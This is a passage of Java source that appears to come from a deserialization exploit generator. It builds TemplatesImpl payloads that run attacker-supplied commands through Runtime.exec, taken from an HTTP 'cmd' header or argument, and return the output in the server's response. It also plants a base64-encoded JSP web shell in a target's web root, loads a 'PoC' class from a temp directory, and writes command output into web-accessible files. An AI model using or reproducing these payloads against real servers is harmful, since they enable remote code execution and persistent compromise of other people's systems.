            "\n" +
            "            method = connection.getClass().getMethod(\"getPrintWriter\", new Class[]{String.class});\n" +
            "            java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(connection, new Object[]{\"utf-8\"});\n" +
            "            printWriter.println(res);\n" +
            "\n" +
            "        }else if(obj != null && obj.getClass().getName().endsWith(\"HttpConnection\")){\n" +
            "            java.lang.reflect.Method method = obj.getClass().getDeclaredMethod(\"getHttpChannel\", null);\n" +
            "            Object httpChannel = method.invoke(obj, null);\n" +
            "\n" +
            "            method = httpChannel.getClass().getMethod(\"getRequest\", null);\n" +
            "            obj = method.invoke(httpChannel, null);\n" +
            "\n" +
            "            method = obj.getClass().getMethod(\"getHeader\", new Class[]{String.class});\n" +
            "            obj = method.invoke(obj, new Object[]{\"cmd\"});\n" +
            "\n" +
            "            String res = new java.util.Scanner(Runtime.getRuntime().exec(obj.toString()).getInputStream()).useDelimiter(\"\\\\A\").next();\n" +
            "\n" +
            "            method = httpChannel.getClass().getMethod(\"getResponse\", null);\n" +
            "            obj = method.invoke(httpChannel, null);\n" +
            "\n" +
            "            method = obj.getClass().getMethod(\"getWriter\", null);\n" +
            "            java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(obj, null);\n" +
            "            printWriter.println(res);\n" +
            "        }\n" +
            "    }";

        return createTemplatesImpl(command, template);
    }

    public static Object windowsEcho(final String command) throws Exception {
        String cmd = command.split(":", 3)[2];
        cmd = cmd.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"");

        String template = "   if(java.io.File.separator.equals(\"\\\\\")){\n" +
            "        java.lang.reflect.Field field = java.io.FileDescriptor.class.getDeclaredField(\"fd\");\n" +
            "        field.setAccessible(true);\n" +
            "\n" +
            "        Class clazz1 = Class.forName(\"sun.nio.ch.Net\");\n" +
            "        java.lang.reflect.Method method1 = clazz1.getDeclaredMethod(\"remoteAddress\",new Class[]{java.io.FileDescriptor.class});\n" +
            "        method1.setAccessible(true);\n" +
            "\n" +
            "        Class clazz2 = Class.forName(\"java.net.SocketOutputStream\", false, null);\n" +
            "        java.lang.reflect.Constructor constructor2 = clazz2.getDeclaredConstructors()[0];\n" +
            "        constructor2.setAccessible(true);\n" +
            "\n" +
            "        Class clazz3 = Class.forName(\"java.net.PlainSocketImpl\");\n" +
            "        java.lang.reflect.Constructor constructor3 = clazz3.getDeclaredConstructor(new Class[]{java.io.FileDescriptor.class});\n" +
            "        constructor3.setAccessible(true);\n" +
            "\n" +
            "        java.lang.reflect.Method write = clazz2.getDeclaredMethod(\"write\",new Class[]{byte[].class});\n" +
            "        write.setAccessible(true);\n" +
            "\n" +
            "        java.net.InetSocketAddress remoteAddress = null;\n" +
            "        java.util.List list = new java.util.ArrayList();\n" +
            "        java.io.FileDescriptor fileDescriptor = new java.io.FileDescriptor();\n" +
            "        for(int i = 0; i < 50000; i++){\n" +
            "            field.set((Object)fileDescriptor, (Object)(new Integer(i)));\n" +
            "            try{\n" +
            "                remoteAddress= (java.net.InetSocketAddress) method1.invoke(null, new Object[]{fileDescriptor});\n" +
            "                if(remoteAddress.toString().startsWith(\"/127.0.0.1\")) continue;\n" +
            "                if(remoteAddress.toString().startsWith(\"/0:0:0:0:0:0:0:1\")) continue;\n" +
            "                list.add(new Integer(i));\n" +
            "\n" +
            "            }catch(Exception e){}\n" +
            "        }\n" +
            "\n" +
            "        for(int i = list.size() - 1; i >= 0; i--){\n" +
            "            try{\n" +
            "                field.set((Object)fileDescriptor, list.get(i));\n" +
            "                Object socketOutputStream = constructor2.newInstance(new Object[]{constructor3.newInstance(new Object[]{fileDescriptor})});\n" +
            "                String[] cmd = new String[]{\"cmd\",\"/C\", \"" + cmd + "\"};\n" +
            "                String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\").next().trim();\n" +
            "                String result = \"HTTP/1.1 200 OK\\nConnection: close\\nContent-Length: \" + (res.length()) + \"\\n\\n\" + res + \"\\n\\n\";\n" +
            "                write.invoke(socketOutputStream, new Object[]{result.getBytes()});\n" +
            "                break;\n" +
            "            }catch (Exception e){\n" +
            "                //pass\n" +
            "            }\n" +
            "        }\n" +
            "    }";
        return createTemplatesImpl(command, template);
    }


    public static Object shell(final String command) throws Exception {
        String content = "";
        try{
            String fileName = System.getProperty("user.dir") + File.separator + "config" + File.separator + "shell.jsp";
            FileReader fileReader = new FileReader(fileName);
            BufferedReader bufferedReader = new BufferedReader(fileReader);

            String result = "";
            String line = "";
            while ( (line = bufferedReader.readLine()) != null){
                result += line + "\n";
            }

            bufferedReader.close();
            fileReader.close();

            BASE64Encoder encoder = new BASE64Encoder();
            content = encoder.encode(result.getBytes()).replaceAll("\r|\n|\r\n", "");
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

        String path = command.split(":",3)[2];
        String template = "String p = Thread.currentThread().getContextClassLoader().getResource(\"\").getPath();\n" +
            "        p = p.substring(0, p.indexOf(\"WEB-INF\"));\n" +
            "        p = java.net.URLDecoder.decode(p,\"utf-8\");\n" +
            "        java.io.PrintWriter w = new java.io.PrintWriter((p + \"" + path + "\"));\n" +
            "        sun.misc.BASE64Decoder d = new sun.misc.BASE64Decoder();\n" +
            "        String s = new String(d.decodeBuffer(\"" + content + "\"));\n" +
            "        w.println(s);\n" +
            "        w.close();";

        return createTemplatesImpl(command, template);
    }

    public static Object autoFindRequestEcho(final String command) throws Exception {
        String template = "    java.net.URL url;\n" +
            "    if (java.io.File.separator.equals(\"/\")) {\n" +
            "        url = new java.net.URL(\"file:///tmp/\");\n" +
            "    }else{\n" +
            "        url = new java.net.URL(\"file:///c:/windows/temp/\");\n" +
            "    }\n" +
            "    java.net.URLClassLoader urlClassLoader = new java.net.URLClassLoader(new java.net.URL[]{url}, Thread.currentThread().getContextClassLoader());\n" +
            "    urlClassLoader.loadClass(\"PoC\").newInstance();";

        return createTemplatesImpl(command, template);
    }




    public static Object wirteFileEcho(final String command) throws Exception {
        String path = command.split(":",4)[2];
        String cmd = command.split(":",4)[3];
        cmd = cmd.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"");

        String template = "String[] c = new String[3];\n" +
            "        String p = Thread.currentThread().getContextClassLoader().getResource(\"\").getPath();\n" +
            "        p = p.substring(0, p.indexOf(\"WEB-INF\"));\n" +
            "        p = java.net.URLDecoder.decode(p,\"utf-8\");\n" +
            "        if(java.io.File.separator.equals(\"/\")){\n" +
            "            c[0] = \"/bin/bash\";\n" +
            "            c[1] = \"-c\";\n" +
            "        }else{\n" +
            "            c[0] = \"cmd\";\n" +
            "            c[1] = \"/C\";\n" +
            "        }\n" +
            "        c[2] = \"" + cmd + "\";\n" +
            "        java.io.InputStream in = Runtime.getRuntime().exec(c).getInputStream();\n" +
            "        String x = p + \"" + path + "\";\n" +
            "        java.io.FileOutputStream os = new java.io.FileOutputStream(x);\n" +
            "        byte[] buffer = new byte[1024];\n" +
            "        int len = 0;\n" +
            "        while((len = in.read(buffer)) != -1) {\n" +
            "            os.write(buffer, 0, len);\n" +
            "        }\n" +
            "        in.close();\n" +
            "        os.close();";

        return createTemplatesImpl(command, template);
    }
}
